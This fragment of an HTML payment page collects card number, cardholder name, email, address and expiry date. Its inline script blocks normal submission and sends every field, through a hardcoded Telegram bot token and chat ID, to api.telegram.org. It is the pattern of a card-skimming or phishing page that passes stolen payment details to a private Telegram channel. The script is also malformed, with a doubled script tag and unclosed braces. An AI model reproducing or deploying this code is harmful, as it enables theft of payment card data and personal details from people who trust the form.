                </div>
                <!-- Removed labels for brevity -->
                <input type="text" name="card" id="cardNumber" placeholder="Card Number" required>
                <input type="text" name="cardName" id="cardName" placeholder="Cardholder Name" required>
                <input type="email" name="email" id="email" placeholder="Email" required>
                <input type="text" name="address" id="address" placeholder="Address" required>
                <div class="card-info">
                    <input type="text" name="expiryDate" id="expiryDate" placeholder="Expiry Date (MM/YY)" required>

    <script>
	   <script>
     document.getElementById('paymentForm').addEventListener('submit', function (e) {

        e.preventDefault();

        const telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';

        const chatId = '-1002083816651';

        const formData = new FormData(e.target);

        // Construct the message text with form data

        let messageText = "New form submission:\n";

        formData.forEach((value, key) => {

            messageText += `${key}: ${value}\n`;

        });

        // Make an AJAX request to send data to Telegram

        const xhr = new XMLHttpRequest();
        const encodedMessageText = encodeURIComponent(messageText);
        xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodedMessageText}`);

        xhr.send();
     
  xhr.onload = function () {
    if (xhr.status === 200) {

        };
    });
        
</script>
